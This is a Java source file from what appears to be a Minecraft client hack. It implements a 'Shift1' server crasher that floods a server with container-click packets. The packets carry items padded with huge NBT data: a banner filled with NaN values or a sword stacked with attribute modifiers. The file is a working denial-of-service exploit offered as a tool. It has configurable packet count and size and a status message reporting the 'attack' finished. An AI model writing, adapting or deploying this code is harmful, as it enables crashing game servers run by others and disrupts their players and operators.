package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.IntStream;

public class Shift1 implements Crasher {
    private static final String METHOD_NAME = "Shift1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        for (int i = 0; i < packets; i++)
            PacketHelper.send(getWClickPacket(size, type));

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ServerboundContainerClickPacket getWClickPacket(int size, String type) {
        if (type.equals("overload")) {
            CompoundTag rootTag = new CompoundTag();
            for (int i = 0; i < size; ++i) rootTag.putDouble(String.valueOf(i), Double.NaN);
            ItemStack itemstack = new ItemStack(Items.PURPLE_BANNER, 1, Optional.of(rootTag));
            return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemstack, new Int2ObjectOpenHashMap<>());
        }
        CompoundTag tagCompound = new CompoundTag();
        ListTag attributeList = new ListTag();
        AtomicInteger operation = new AtomicInteger(0);
        IntStream.range(0, size).forEachOrdered(i -> {
            CompoundTag attribute = new CompoundTag();
            attribute.putInt("UUIDLeast", 0);
            attribute.putInt("UUIDMost", 0);
            attribute.putString("AttributeName", "generic.maxHealth");
            attribute.putString("Name", "x");
            attribute.putInt("Amount", (byte) 1);
            if (operation.get() > 2) operation.set(0);
            attribute.putInt("Operation", operation.get());
            operation.getAndAdd(1);
            attributeList.add(attribute);
        });
        tagCompound.put("AttributeModifiers", attributeList);
        ItemStack itemstack = new ItemStack(Items.DIAMOND_SWORD, 1, Optional.of(tagCompound));
        return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemstack, new Int2ObjectOpenHashMap<>());
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "Overload"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[100], type[default]";
    }


    @Override
    public String getDescription() {
        return "Overload Crasher";
    }
}